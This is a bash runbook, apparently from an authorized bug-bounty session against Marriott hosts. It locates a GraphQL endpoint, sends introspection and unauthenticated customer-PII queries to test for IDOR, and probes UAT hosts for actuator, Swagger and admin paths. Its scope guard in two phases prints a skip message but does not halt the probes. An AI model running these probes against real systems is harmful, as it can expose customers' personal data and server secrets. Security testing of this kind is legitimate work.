#!/usr/bin/env bash
# PI-RUNBOOK-session20-graphql-endpoint-idor.sh
#
# SESSION 20 — Phoenix GraphQL endpoint discovery + IDOR probe + UAT host fingerprint
#
# CONTEXT (Session 19 findings — ALL PHASES COMPLETE):
#   B3: 67 phoenixAccount* GraphQL operations in graphql-chunk (330KB)
#       Key ops: LookupCustomerProfiles, GetPersonalInformation, GetWalletPaymentInfo,
#                GetOrderDetailsByOrderId, GetOrdersByCustomerId, UpdateCustomerPaymentMethod
#       revisionToken = optimistic lock on write ops
#       NO ENDPOINT URL FOUND in graphql-chunk — it's in a different bundle
#   C: AEM + Next.js hybrid. auth-apc ONLY exposes /login. ALL other paths 000.
#      Build ID extraction failed — custom basePath; need grep on script src tags
#      JCR path: /content/mi-account/na/en-us/eaa/login/jcr:content
#   D (efast ACS probe — S19 COMPLETE, M021 CLOSED):
#      D3: POST unsigned SAMLResponse → HTTP 400 + Claresco GenericError.ctp
#      D4: Wrong-issuer SAMLResponse → HTTP 400, same error
#      VERDICT: SP correctly validates signature. NO AUTH BYPASS.
#   E (CT enum — S19 COMPLETE, M023 NEW):
#      %.uat.marriott.com → 6 hosts: micmt.uat.marriott.com,
#      micommissionmanagementtool.uat.marriott.com + www-prefixed variants.
#      crt.sh still 502 for apigwc/apigatewayc/artifactory.
#   G (CVE-2025-29927 — S19 COMPLETE, CONFIRMED NOT EXPLOITABLE):
#      All auth-apc paths return 000 baseline AND with x-middleware-subrequest: middleware.
#      CVE cannot reach protected routes externally — firewall blocks all non-/login paths.
#
# HYPOTHESIS: GraphQL endpoint is at gateway-apc.marriott.com (IN-SCOPE via *gateway-apc.marriott.com)
#   The auth-apc Next.js SPA loads graphql-chunk which calls a backend API gateway.
#   After login, the browser calls the phoenix GraphQL API at the APC API gateway.
#
# SCOPE GUARD:
#   extranetcloud.marriott.com = OUT-OF-SCOPE
#   gateway-apc.marriott.com   = IN-SCOPE (matches *gateway-apc.marriott.com wildcard)
#   micmt.uat.marriott.com     = IN-SCOPE (matches *uat.marriott.com wildcard)
#   auth-apc.marriott.com      = IN-SCOPE
#
# PHASES:
#   A  — Extract Build ID from script src tags + mine app bundle chunk list
#   B  — Download + mine app initialization chunks for Apollo Client config
#   C  — Probe gateway-apc.marriott.com and variants for GraphQL endpoint
#   D  — Test phoenix GraphQL operations (unauthenticated + IDOR) at discovered endpoint
#   E  — UAT host fingerprint: micmt.uat.marriott.com + micommissionmanagementtool.uat.marriott.com
#   F  — Decision gate
# (ACS probe and CVE-2025-29927 omitted — both completed in Session 19, results known)

set -euo pipefail
OUTDIR=/tmp/s20
S19DIR=/tmp/s19
S18DIR=/tmp/s18
CHUNKS_DIR="$S18DIR/apc-chunks"
mkdir -p "$OUTDIR" "$OUTDIR/chunks"
exec > >(tee "$OUTDIR/session20.log") 2>&1

SCOPE_FILE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/config/marriott-scope.yaml"
SCOPE_SCRIPT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/scripts/scope-check.sh"

scope_check() {
  local host="$1"
  result=$(SCOPE_FILE="$SCOPE_FILE" "$SCOPE_SCRIPT" "$host" 2>&1) || true
  echo "scope[$host] => $result"
  if ! echo "$result" | grep -q "^IN-SCOPE"; then
    echo "SKIP: $host is OUT-OF-SCOPE."
    return 1
  fi
  return 0
}

BASE_APC="https://auth-apc.marriott.com"
BASE_EFAST="https://efast.marriott.com"
APC_ASSET_BASE="${BASE_APC}/mi-assets/mi-static/mi-account-renderer/web-rel-26.6.1-5d80cc6-11089/_next/static"

# ─────────────────────────────────────────────────────────────────────────────
echo "================================================================"
echo "PHASE A — Extract Build ID + full chunk list from login page HTML"
echo "================================================================"

scope_check "auth-apc.marriott.com" || { echo "SKIP Phase A"; }

# Reuse S19 login HTML or re-fetch
LOGIN_HTML="$S19DIR/apc-login.html"
if [ ! -f "$LOGIN_HTML" ] || [ "$(wc -c < "$LOGIN_HTML")" -lt 10000 ]; then
  echo "A0: Re-fetching login page..."
  curl -s --max-time 20 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_APC}/login" \
    -o "$LOGIN_HTML"
fi
echo "A0: Login HTML: $(wc -c < "$LOGIN_HTML")B"

echo ""
echo "--- A1: Extract Next.js Build ID from script src tags ---"
BUILD_ID=$(python3 - <<'PYEOF' 2>/dev/null || echo "")
import re
html = open("/tmp/s19/apc-login.html").read()

# Try __NEXT_DATA__ first
m = re.search(r'"buildId"\s*:\s*"([^"]+)"', html)
if m:
    print(m.group(1))
    exit(0)

# Try script src tags containing /_next/static/<buildId>/
# Pattern: _next/static/<hash>/_buildManifest.js or similar
m = re.search(r'_next/static/([a-zA-Z0-9_-]{8,})/(?:_buildManifest|_ssgManifest)', html)
if m:
    print(m.group(1))
    exit(0)

# Try any _next/static/<hash>/ pattern in script srcs
# Could be under a custom basePath
m = re.search(r'mi-account-renderer/web-rel-[^/]+/_next/static/([^/]+)/_buildManifest', html)
if m:
    print(m.group(1))
    exit(0)

# Try chunks with hash pattern: chunks/HASH.js or chunks/NAME-HASH.js
# The buildId sometimes matches the static dir hash
scripts = re.findall(r'src=["\']([^"\']*_next/static/([^/]+)/[^"\']*)["\']', html)
hashes = set()
for src, h in scripts:
    if re.match(r'^[a-zA-Z0-9_-]{8,}$', h):
        hashes.add(h)
if hashes:
    # Use the hash that appears in a _buildManifest path
    print(list(hashes)[0])
PYEOF

echo "A1: Build ID = '${BUILD_ID}'"

echo ""
echo "--- A2: Extract all chunk filenames from login page ---"
python3 - <<PYEOF 2>&1 | tee "$OUTDIR/chunk-list.txt"
import re

html = open("$LOGIN_HTML").read()

# Extract all _next/static/chunks/*.js paths
# May be under custom basePath like /mi-assets/mi-static/mi-account-renderer/.../
chunks = re.findall(r'["\']([^"\']*_next/static/(?:chunks|pages|css)/[^"\']+\.(?:js|css))["\']', html)
chunks = sorted(set(chunks))

print(f"Total chunk paths found: {len(chunks)}")
print()

# Categorize
app_chunks = [c for c in chunks if any(k in c for k in ['_app', 'pages/_app', 'main-', 'webpack', 'polyfill', 'framework'])]
page_chunks = [c for c in chunks if '/pages/' in c and '_app' not in c]
other_chunks = [c for c in chunks if c not in app_chunks and c not in page_chunks]

print(f"=== App/Framework Chunks ({len(app_chunks)}) — HIGHEST PRIORITY for Apollo config ===")
for c in app_chunks:
    print(f"  {c}")

print(f"\n=== Page Chunks ({len(page_chunks)}) ===")
for c in page_chunks[:20]:
    print(f"  {c}")

print(f"\n=== Other Chunks ({len(other_chunks)}) ===")
for c in other_chunks[:30]:
    print(f"  {c}")
PYEOF

sleep 2

echo ""
echo "--- A3: Download priority chunks (app + main bundles) ---"
# Priority: _app chunk, main chunk, webpack chunk — these contain Apollo Client config
PRIORITY_CHUNKS=$(python3 - <<PYEOF 2>/dev/null || echo ""
import re
try:
    content = open("$OUTDIR/chunk-list.txt").read()
    # Extract chunk URLs from the list, prioritize by name
    chunks = re.findall(r'  (https?://[^\s]+|/[^\s]+\.js)', content)
    # Deduplicate and prioritize
    seen = set()
    priority = []
    other = []
    for c in chunks:
        if c in seen: continue
        seen.add(c)
        name = c.split('/')[-1].lower()
        if any(k in name for k in ['_app', 'main-', 'webpack', 'framework-', 'app-']):
            priority.append(c)
        else:
            other.append(c)
    for c in priority[:6]:
        print(c)
PYEOF
)

if [ -n "$PRIORITY_CHUNKS" ]; then
  echo "A3: Downloading priority chunks:"
  while IFS= read -r chunk_path; do
    [ -z "$chunk_path" ] && continue
    # Build full URL if relative
    if [[ "$chunk_path" == /* ]]; then
      chunk_url="${BASE_APC}${chunk_path}"
    else
      chunk_url="$chunk_path"
    fi
    chunk_name=$(basename "$chunk_path")
    echo "A3: Fetching $chunk_name ..."
    curl -s --max-time 30 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      -H "Referer: https://auth-apc.marriott.com/login" \
      "$chunk_url" \
      -o "$OUTDIR/chunks/$chunk_name" 2>/dev/null || true
    size=$(wc -c < "$OUTDIR/chunks/$chunk_name" 2>/dev/null || echo 0)
    echo "A3: $chunk_name: ${size}B"
    sleep 2
  done <<< "$PRIORITY_CHUNKS"
else
  echo "A3: No chunk paths extracted from HTML — downloading common Next.js files directly"
  # Fallback: try common Next.js chunk patterns
  for name in "webpack.js" "main.js" "pages/_app.js"; do
    url="${APC_ASSET_BASE}/chunks/${name}"
    fname=$(basename "$name")
    curl -s --max-time 20 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "$url" -o "$OUTDIR/chunks/$fname" 2>/dev/null || true
    size=$(wc -c < "$OUTDIR/chunks/$fname" 2>/dev/null || echo 0)
    echo "A3: $fname: ${size}B"
    sleep 1
  done
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE B — Mine downloaded chunks for GraphQL endpoint + Apollo config"
echo "================================================================"

echo "--- B1: Search all chunks for GraphQL endpoint URL ---"
python3 - <<PYEOF 2>&1 | tee "$OUTDIR/endpoint-hunt.txt"
import re, os, glob

outdir = "/tmp/s20"

# Scan all downloaded chunks + S18 chunks
chunk_dirs = [f"{outdir}/chunks", "/tmp/s18/apc-chunks"]
all_files = []
for d in chunk_dirs:
    all_files.extend(glob.glob(f"{d}/*.js"))

print(f"Scanning {len(all_files)} chunk files for GraphQL endpoint...")
print()

found_endpoints = set()
found_apollo = set()
found_hosts = set()

for fpath in all_files:
    try:
        js = open(fpath).read()
        fname = os.path.basename(fpath)

        # 1. GraphQL endpoint URLs
        gql_urls = re.findall(r'["\x60]([^"\x60]*(?:/graphql|/gql|/phoenix)[^"\x60]{0,50})["\x60]', js, re.IGNORECASE)
        for u in gql_urls:
            if len(u) > 3 and ' ' not in u:
                found_endpoints.add((fname, u))

        # 2. Apollo Client initialization patterns
        apollo = re.findall(r'(?:uri|endpoint|url)\s*[=:]\s*["\x60]([^"\x60]{10,200})["\x60]', js, re.IGNORECASE)
        for a in apollo:
            if 'marriott' in a.lower() or 'api' in a.lower() or 'gateway' in a.lower():
                found_apollo.add((fname, a))

        # 3. Any marriott/bonvoy host references
        hosts = re.findall(r'https?://([a-z0-9][a-z0-9.-]+\.(?:marriott|bonvoy)\.com)', js, re.IGNORECASE)
        for h in hosts:
            found_hosts.add((fname, h.lower()))

        # 4. Environment variable references that might contain endpoint
        env_refs = re.findall(r'process\.env\.([A-Z_]{5,}GRAPHQL[A-Z_]*|[A-Z_]*API[A-Z_]*URL[A-Z_]*)', js)
        for e in env_refs:
            print(f"  ENV REF in {fname}: {e}")

        # 5. Injected runtime config (Next.js publicRuntimeConfig)
        runtime_cfg = re.findall(r'(?:publicRuntimeConfig|serverRuntimeConfig|runtimeConfig)\s*[=:]\s*\{([^}]{10,500})\}', js, re.DOTALL)
        for cfg in runtime_cfg[:3]:
            print(f"  RUNTIME CONFIG in {fname}: {cfg[:300]}")

    except Exception as e:
        print(f"  Error reading {fname}: {e}")

print(f"\n=== GraphQL Endpoint Candidates ({len(found_endpoints)}) ===")
for fname, url in sorted(found_endpoints):
    print(f"  [{fname}] {url}")

print(f"\n=== Apollo/HTTP Client URI Config ({len(found_apollo)}) ===")
for fname, uri in sorted(found_apollo):
    print(f"  [{fname}] {uri}")

print(f"\n=== Marriott/Bonvoy Hostnames Found ({len(found_hosts)}) ===")
unique_hosts = set(h for _, h in found_hosts)
for h in sorted(unique_hosts):
    files = [f for f, fh in found_hosts if fh == h]
    print(f"  {h} (in: {', '.join(set(files)[:3])})")

PYEOF

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE C — Probe gateway-apc.marriott.com for GraphQL endpoint"
echo "================================================================"

scope_check "gateway-apc.marriott.com" || { echo "SKIP Phase C"; }

GW_BASE="https://gateway-apc.marriott.com"

echo "--- C1: gateway-apc.marriott.com root + fingerprint ---"
curl -sv --max-time 20 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -D "$OUTDIR/gw-root-headers.txt" \
  "$GW_BASE/" \
  -o "$OUTDIR/gw-root-body.html" 2>&1 | grep -E "HTTP/|< [Ss]erver|< [Xx]-|< [Ll]ocation|< [Cc]ontent" | head -20 || true
GW_CODE=$(grep -m1 "^HTTP" "$OUTDIR/gw-root-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
GW_SIZE=$(wc -c < "$OUTDIR/gw-root-body.html" 2>/dev/null || echo 0)
echo "C1: gateway-apc root: $GW_CODE (${GW_SIZE}B)"
head -c 300 "$OUTDIR/gw-root-body.html" 2>/dev/null || true

sleep 2

echo ""
echo "--- C2: GraphQL endpoint paths on gateway-apc ---"
for path in \
  "/graphql" \
  "/api/graphql" \
  "/phoenix/graphql" \
  "/account/graphql" \
  "/bonvoy/graphql" \
  "/v1/graphql" \
  "/api/v1/graphql" \
  "/api/phoenix" \
  "/api/account" \
  "/health" \
  "/api/health" \
  "/.well-known/graphql"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${GW_BASE}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "C2 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- C3: POST /graphql on gateway-apc with introspection query ---"
# Introspection query: asks the GraphQL server for its schema
# If it responds with __schema data, endpoint is confirmed + schema enumerable
INTROSPECT_QUERY='{"query":"{__schema{queryType{name}types{name kind}}}"}'
curl -sv --max-time 20 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -H "Content-Type: application/json" \
  -H "Origin: https://auth-apc.marriott.com" \
  -H "Referer: https://auth-apc.marriott.com/login" \
  -X POST \
  -d "$INTROSPECT_QUERY" \
  -D "$OUTDIR/gw-graphql-headers.txt" \
  "${GW_BASE}/graphql" \
  -o "$OUTDIR/gw-graphql-body.json" 2>&1 | grep -E "HTTP/|< [Ss]erver|< [Cc]ontent|< [Aa]ccess" | head -10 || true
GQL_CODE=$(grep -m1 "^HTTP" "$OUTDIR/gw-graphql-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
GQL_SIZE=$(wc -c < "$OUTDIR/gw-graphql-body.json" 2>/dev/null || echo 0)
echo "C3: POST /graphql introspection: $GQL_CODE (${GQL_SIZE}B)"
head -c 400 "$OUTDIR/gw-graphql-body.json" 2>/dev/null || true

sleep 2

echo ""
echo "--- C4: Probe variant gateway hostnames (same wildcard) ---"
for gw_host in \
  "api-gateway-apc.marriott.com" \
  "apigw-apc.marriott.com" \
  "phoenix-gateway-apc.marriott.com" \
  "account-gateway-apc.marriott.com"
do
  if SCOPE_FILE="$SCOPE_FILE" "$SCOPE_SCRIPT" "$gw_host" 2>&1 | grep -q "^IN-SCOPE"; then
    resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 10 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "https://${gw_host}/" 2>/dev/null || echo "000|0")
    code=$(echo "$resp" | cut -d'|' -f1)
    size=$(echo "$resp" | cut -d'|' -f2)
    echo "C4 ${gw_host}: ${code}/${size}B"
    sleep 1
  else
    echo "C4 ${gw_host}: OUT-OF-SCOPE — skip"
  fi
done

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE D — Test phoenix GraphQL operations at discovered endpoint"
echo "================================================================"
# Only run if Phase C found a live GraphQL endpoint
# SAFE: read-only queries only. No real user data will be exfiltrated.
# We test with our OWN Marriott Bonvoy member number (if available) first,
# then test with an incremented/arbitrary customerId to check IDOR.
# DO NOT attempt to access or use real data from other accounts.
# DO NOT store any PII from responses. Log HTTP status + response structure only.

GQL_ENDPOINT=""

# Check if gateway-apc /graphql responded
if [ -f "$OUTDIR/gw-graphql-body.json" ]; then
  if grep -q "__schema\|types\|queryType\|phoenixAccount" "$OUTDIR/gw-graphql-body.json" 2>/dev/null; then
    GQL_ENDPOINT="${GW_BASE}/graphql"
    echo "D0: GraphQL endpoint CONFIRMED at $GQL_ENDPOINT (introspection response)"
  fi
fi

# Also check from Phase B endpoint hunt
if [ -z "$GQL_ENDPOINT" ] && [ -f "$OUTDIR/endpoint-hunt.txt" ]; then
  FOUND_URL=$(grep -oP 'https?://[^\s]+(?:/graphql|/phoenix)' "$OUTDIR/endpoint-hunt.txt" | head -1 || echo "")
  if [ -n "$FOUND_URL" ]; then
    GQL_ENDPOINT="$FOUND_URL"
    echo "D0: GraphQL endpoint from B1 hunt: $GQL_ENDPOINT"
  fi
fi

if [ -z "$GQL_ENDPOINT" ]; then
  echo "D0: GraphQL endpoint NOT YET FOUND. Skipping Phase D."
  echo "D0: Next steps:"
  echo "  1. Log in to auth-apc.marriott.com in browser, capture network requests to find endpoint"
  echo "  2. Check if auth-apc serves GraphQL at a path not yet probed"
  echo "  3. Try probing other in-scope APC cluster hosts"
else
  echo ""
  echo "--- D1: Introspection query (full schema dump) ---"
  FULL_INTRO='{"query":"{\n  __schema {\n    queryType { name }\n    mutationType { name }\n    types {\n      name\n      kind\n      fields { name type { name kind ofType { name kind } } }\n    }\n  }\n}"}'
  curl -s --max-time 30 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "Content-Type: application/json" \
    -H "Origin: https://auth-apc.marriott.com" \
    -X POST -d "$FULL_INTRO" \
    "$GQL_ENDPOINT" \
    -o "$OUTDIR/gql-introspect-full.json"
  echo "D1: Full introspection: $(wc -c < "$OUTDIR/gql-introspect-full.json")B"
  head -c 500 "$OUTDIR/gql-introspect-full.json" || true
  sleep 2

  echo ""
  echo "--- D2: Unauthenticated phoenix query — GetProfileDetails ---"
  # Test if any operation works without an auth token
  PROFILE_QUERY='{"operationName":"phoenixAccountGetProfileDetails","query":"query phoenixAccountGetProfileDetails($customerId: String!) { phoenixAccountGetProfileDetails(customerId: $customerId) { firstName lastName email memberId tierLevel } }","variables":{"customerId":"TEST12345"}}'
  curl -s --max-time 20 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "Content-Type: application/json" \
    -H "Origin: https://auth-apc.marriott.com" \
    -X POST -d "$PROFILE_QUERY" \
    "$GQL_ENDPOINT" \
    -o "$OUTDIR/gql-profile-noauth.json"
  D2_SIZE=$(wc -c < "$OUTDIR/gql-profile-noauth.json" 2>/dev/null || echo 0)
  echo "D2: GetProfileDetails (no auth): ${D2_SIZE}B"
  head -c 400 "$OUTDIR/gql-profile-noauth.json" || true

  echo ""
  echo "--- D3: Unauthenticated phoenix query — LookupCustomerProfiles ---"
  LOOKUP_QUERY='{"operationName":"phoenixAccountLookupCustomerProfiles","query":"query phoenixAccountLookupCustomerProfiles($input: CustomerProfilesLookupInput!) { phoenixAccountLookupCustomerProfiles(input: $input) { firstName lastName email memberId } }","variables":{"input":{"memberId":"TEST12345"}}}'
  curl -s --max-time 20 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "Content-Type: application/json" \
    -H "Origin: https://auth-apc.marriott.com" \
    -X POST -d "$LOOKUP_QUERY" \
    "$GQL_ENDPOINT" \
    -o "$OUTDIR/gql-lookup-noauth.json"
  D3_SIZE=$(wc -c < "$OUTDIR/gql-lookup-noauth.json" 2>/dev/null || echo 0)
  echo "D3: LookupCustomerProfiles (no auth): ${D3_SIZE}B"
  head -c 400 "$OUTDIR/gql-lookup-noauth.json" || true
  sleep 2

  echo ""
  echo "--- D4: Analyze GraphQL auth posture ---"
  python3 - <<PYEOF 2>&1
import os, re, json

outdir = "/tmp/s20"
print("=== GraphQL Auth Posture Analysis ===\n")

for label, fname in [
    ("D2 GetProfileDetails (no auth)", "gql-profile-noauth.json"),
    ("D3 LookupCustomerProfiles (no auth)", "gql-lookup-noauth.json"),
]:
    fpath = os.path.join(outdir, fname)
    if not os.path.exists(fpath):
        print(f"{label}: FILE NOT FOUND")
        continue
    try:
        body = open(fpath).read()
        size = len(body)
        data = json.loads(body)
        errors = data.get("errors", [])
        data_val = data.get("data", {})

        print(f"{label} ({size}B):")
        if errors:
            print(f"  Errors: {errors[0].get('message','')[:150]}")
            if any(k in str(errors).lower() for k in ["unauthorized","unauthenticated","forbidden","not allowed","token","jwt"]):
                print("  AUTH VERDICT: PROTECTED — requires authentication")
            else:
                print("  AUTH VERDICT: AMBIGUOUS error (not a clear auth error)")
        elif data_val and any(v for v in data_val.values() if v is not None):
            print(f"  Data returned: {str(data_val)[:300]}")
            print("  !!! AUTH VERDICT: UNAUTHENTICATED ACCESS — DATA RETURNED WITHOUT AUTH !!!")
        else:
            print(f"  No data, no errors — raw body: {body[:200]}")
            print("  AUTH VERDICT: AMBIGUOUS")
    except json.JSONDecodeError:
        body = open(fpath).read()
        print(f"{label}: Non-JSON response ({len(body)}B): {body[:200]}")
    print()
PYEOF
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE E — UAT host fingerprint: micmt.uat.marriott.com (M023)"
echo "================================================================"
# Session 19 CT enum found: micmt.uat.marriott.com + micommissionmanagementtool.uat.marriott.com
# Both in-scope via *uat.marriott.com wildcard.
# UAT environments often expose: Spring Boot actuator, Swagger UI, missing auth on APIs.
# MI Commission Management Tool = property commission data for hotel managers.

for UAT_HOST in "micmt.uat.marriott.com" "micommissionmanagementtool.uat.marriott.com"; do
  scope_check "$UAT_HOST" || { echo "SKIP Phase E for $UAT_HOST"; continue; }

  echo ""
  echo "--- E1: Root fingerprint of $UAT_HOST ---"
  RESP=$(curl -sv --max-time 20 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -D "$OUTDIR/uat-${UAT_HOST}-root-headers.txt" \
    "https://${UAT_HOST}/" \
    -o "$OUTDIR/uat-${UAT_HOST}-root-body.html" 2>&1 | \
    grep -E "HTTP/|< [Ss]erver|< [Xx]-[Pp]owered|< [Cc]ontent|< [Ll]ocation|< [Ss]et-[Cc]ookie" | head -15) || true
  echo "$RESP"
  UAT_CODE=$(grep -m1 "^HTTP" "$OUTDIR/uat-${UAT_HOST}-root-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
  UAT_SIZE=$(wc -c < "$OUTDIR/uat-${UAT_HOST}-root-body.html" 2>/dev/null || echo 0)
  echo "E1 $UAT_HOST root: $UAT_CODE (${UAT_SIZE}B)"
  head -c 500 "$OUTDIR/uat-${UAT_HOST}-root-body.html" 2>/dev/null || true
  sleep 2

  echo ""
  echo "--- E2: High-value paths on $UAT_HOST ---"
  for path in \
    "/actuator" "/actuator/health" "/actuator/env" "/actuator/mappings" "/actuator/info" \
    "/swagger-ui.html" "/swagger-ui/index.html" "/v2/api-docs" "/v3/api-docs" "/openapi.json" \
    "/api/v1" "/api/v1/health" "/api/health" "/health" \
    "/login" "/api/login" "/admin" "/debug" "/console"
  do
    resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 10 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "https://${UAT_HOST}${path}" 2>/dev/null || echo "000|0")
    code=$(echo "$resp" | cut -d'|' -f1)
    size=$(echo "$resp" | cut -d'|' -f2)
    # Flag non-SPA-catch-all responses (SPA = uniform large body or 404)
    marker=""
    if [[ "$code" == "200" ]] && [[ "$size" -lt 10000 ]] && [[ "$size" -gt 0 ]]; then
      marker=" *** NON-SPA DIFFERENTIAL ***"
    elif [[ "$code" == "200" ]] && [[ "$size" -gt 0 ]]; then
      marker=" (large — may be SPA catch-all)"
    elif [[ "$code" != "404" ]] && [[ "$code" != "000" ]]; then
      marker=" *** INTERESTING ***"
    fi
    echo "E2 $UAT_HOST ${path}: ${code}/${size}B${marker}"
    sleep 1
  done
done

echo ""
echo "--- E3: Analyze UAT probe results ---"
python3 - <<'PYEOF'
import os, re

outdir = "/tmp/s20"
uat_hosts = ["micmt.uat.marriott.com", "micommissionmanagementtool.uat.marriott.com"]
print("=== UAT Host Analysis ===\n")

for host in uat_hosts:
    body_f = f"{outdir}/uat-{host}-root-body.html"
    headers_f = f"{outdir}/uat-{host}-root-headers.txt"

    if not os.path.exists(body_f):
        print(f"{host}: NOT PROBED (connection failed or skipped)")
        continue

    body = open(body_f).read()
    headers = open(headers_f).read() if os.path.exists(headers_f) else ""

    http = next((l.strip() for l in headers.splitlines() if l.startswith("HTTP")), "000")
    server = next((l.strip() for l in headers.splitlines() if "server:" in l.lower()), "unknown")
    powered = next((l.strip() for l in headers.splitlines() if "x-powered-by:" in l.lower()), "")
    loc = next((l.strip() for l in headers.splitlines() if "location:" in l.lower()), "")

    print(f"Host: {host}")
    print(f"  HTTP: {http}")
    print(f"  Server: {server}")
    if powered: print(f"  Powered-by: {powered}")
    if loc:     print(f"  Location: {loc}")
    print(f"  Body size: {len(body)}B")

    tech = []
    if re.search(r'react|__REACT|__NEXT', body, re.IGNORECASE): tech.append("React/Next.js")
    if re.search(r'angular', body, re.IGNORECASE): tech.append("Angular")
    if re.search(r'spring|springframework', body + headers, re.IGNORECASE): tech.append("Spring")
    if re.search(r'tomcat|catalina', body + headers, re.IGNORECASE): tech.append("Tomcat")
    if re.search(r'nginx', headers, re.IGNORECASE): tech.append("nginx")
    if re.search(r'iis|asp\.net', headers, re.IGNORECASE): tech.append("IIS/ASP.NET")
    if tech: print(f"  Tech hints: {', '.join(tech)}")

    title = re.search(r'<title[^>]*>([^<]+)</title>', body, re.IGNORECASE)
    if title: print(f"  Title: {title.group(1).strip()}")

    login_forms = re.findall(r'<form[^>]+action=["\']([^"\']{1,100})["\']', body, re.IGNORECASE)
    if login_forms: print(f"  Form actions: {login_forms[:3]}")

    print()

PYEOF

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE F — Decision Gate"
echo "================================================================"

python3 - <<'PYEOF'
import os, re, glob, json

outdir = "/tmp/s20"
print("=== SESSION 20 DECISION GATE ===\n")

# Phase B: GraphQL endpoint found in chunks?
ep_hunt = open(f"{outdir}/endpoint-hunt.txt").read() if os.path.exists(f"{outdir}/endpoint-hunt.txt") else ""
gql_endpoints = re.findall(r'https?://[^\s]+(?:/graphql|/phoenix)', ep_hunt, re.IGNORECASE)
if gql_endpoints:
    print(f"B (endpoint hunt): FOUND {len(gql_endpoints)} candidate(s): {gql_endpoints[:3]}")
else:
    print("B (endpoint hunt): No endpoint URL found in downloaded chunks")

# Phase C: gateway-apc response
gw_body = open(f"{outdir}/gw-graphql-body.json").read() if os.path.exists(f"{outdir}/gw-graphql-body.json") else ""
gw_size = len(gw_body)
if "__schema" in gw_body or "queryType" in gw_body:
    print(f"\nC (gateway-apc /graphql): !!! GRAPHQL ENDPOINT CONFIRMED — introspection returned schema !!!")
    print(f"  NEXT: run full D-series IDOR tests immediately")
elif "phoenixAccount" in gw_body:
    print(f"\nC (gateway-apc /graphql): PARTIAL — phoenix types in response ({gw_size}B)")
elif gw_size > 0:
    print(f"\nC (gateway-apc /graphql): {gw_size}B response — check: {gw_body[:200]}")
else:
    print(f"\nC (gateway-apc /graphql): No response (000 or empty)")

# Phase D: IDOR test results (only runs if C found endpoint)
for label, fname in [("D2 GetProfileDetails", "gql-profile-noauth.json"),
                      ("D3 LookupCustomerProfiles", "gql-lookup-noauth.json")]:
    fpath = f"{outdir}/{fname}"
    if os.path.exists(fpath):
        body = open(fpath).read()
        has_pii = bool(re.search(r'"(?:firstName|lastName|email|memberId|customerId)"', body))
        has_error = bool(re.search(r'"error"|"errors"', body))
        if has_pii:
            print(f"\nD ({label}): !!! CRITICAL — PII RETURNED WITHOUT AUTH — REPORT IMMEDIATELY !!!")
        elif has_error:
            print(f"\nD ({label}): PROTECTED — errors returned (auth required at endpoint)")
        else:
            print(f"\nD ({label}): AMBIGUOUS — {len(body)}B — manual review needed")
    else:
        print(f"\nD ({label}): NOT RUN (endpoint not found in Phase C)")

# Phase E: UAT host results
uat_hosts = ["micmt.uat.marriott.com", "micommissionmanagementtool.uat.marriott.com"]
for host in uat_hosts:
    body_f = f"{outdir}/uat-{host}-root-body.html"
    if os.path.exists(body_f):
        body = open(body_f).read()
        size = len(body)
        auth_gate = bool(re.search(r'(?:login|sign.in|authenticate|401|403|unauthorized)', body, re.IGNORECASE))
        has_api = bool(re.search(r'(?:swagger|api-docs|actuator|graphql|api/v)', body, re.IGNORECASE))
        if has_api:
            print(f"\nE ({host}): !!! API SURFACE FOUND — probe paths immediately !!!")
        elif auth_gate:
            print(f"\nE ({host}): Auth-gated ({size}B) — may have open paths at /actuator etc.")
        else:
            print(f"\nE ({host}): {size}B — review manually")
    else:
        print(f"\nE ({host}): NOT PROBED")

# Known closed findings (from S19)
print("\n=== KNOWN RESULTS (from Session 19 — no re-run needed) ===")
print("M021 efast ACS: CLOSED — SP validates signatures (HTTP 400 on unsigned POST)")
print("CVE-2025-29927: NOT EXPLOITABLE — all auth-apc paths return 000 from external network")

print("\n=== PRIORITY ACTIONS ===")
print("1. If GraphQL endpoint found + unauth data → report phoenixAccount IDOR (Critical)")
print("2. If UAT actuator/swagger open → test for auth bypass / info disclosure → report (High)")
print("3. If neither → browser-capture GraphQL traffic after manual login to auth-apc")
